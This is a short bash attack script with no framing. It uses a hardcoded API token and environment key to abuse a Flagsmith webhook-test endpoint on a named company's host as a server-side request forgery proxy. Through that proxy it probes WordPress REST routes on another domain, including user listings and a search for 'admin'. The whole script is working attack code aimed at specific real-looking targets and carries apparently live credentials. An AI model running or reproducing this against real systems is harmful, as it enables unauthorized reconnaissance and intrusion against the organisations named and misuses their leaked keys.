#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="5c835df901f2674a0788e25484a73eb42be31713"
EKEY="8uLGCkxcX7sfS5GDFvy3Ah"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

echo "IP: $(curl -s https://ifconfig.me)"

# Test WP REST API public endpoints (via ?rest_route= to avoid /wp-json/ 404)
echo "=== REST API DISCOVERY ==="
echo -n "root -> "
SSRF "https://koinp2p.com/?rest_route=/"
echo ""

echo -n "posts -> "
SSRF "https://koinp2p.com/?rest_route=/wp/v2/posts"
echo ""

echo -n "pages -> "
SSRF "https://koinp2p.com/?rest_route=/wp/v2/pages"
echo ""

echo -n "comments -> "
SSRF "https://koinp2p.com/?rest_route=/wp/v2/comments"
echo ""

echo -n "users -> "
SSRF "https://koinp2p.com/?rest_route=/wp/v2/users"
echo ""

echo -n "search -> "
SSRF "https://koinp2p.com/?rest_route=/wp/v2/search&search=admin"
echo ""
